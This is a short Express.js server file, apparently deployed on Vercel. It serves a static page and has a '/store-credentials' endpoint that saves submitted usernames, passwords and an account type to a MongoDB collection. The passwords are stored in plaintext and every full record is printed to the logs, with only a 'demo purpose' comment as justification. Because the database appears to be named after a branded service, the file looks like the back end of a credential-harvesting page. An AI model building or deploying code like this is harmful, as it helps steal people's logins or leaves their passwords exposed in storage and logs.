require("dotenv").config();

const express = require("express");
const { MongoClient } = require("mongodb");
const path = require("path");

const app = express();
app.use(express.json());

// Static files
app.use(express.static(path.join(__dirname, "public")));
app.use("/src", express.static(path.join(__dirname, "src")));

// MongoDB (serverless-safe)
let cachedClient = null;
let cachedDb = null;

async function connectDB() {
  if (cachedDb) return cachedDb;

  const client = new MongoClient(process.env.MONGODB_URI, {
    serverSelectionTimeoutMS: 5000,
  });

  await client.connect();
  const db = client.db("dkwin_data");

  cachedClient = client;
  cachedDb = db;

  console.log("MongoDB connected");
  return db;
}

// API
app.post("/store-credentials", async (req, res) => {
  try {
    const { type, username, password } = req.body;

    const db = await connectDB();
    const collection = db.collection("credentials_demo");

    const record = {
      type,
      username,
      password, // demo purpose
      timestamp: new Date(),
    };

    await collection.insertOne(record);
    console.log("Stored:", record);

    res.json({ message: "Stored" });
  } catch (err) {
    console.error("DB error:", err.message);
    res.status(500).json({ error: "DB failed" });
  }
});

// Main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// 🔴 IMPORTANT: NO app.listen() ON VERCEL
module.exports = app;
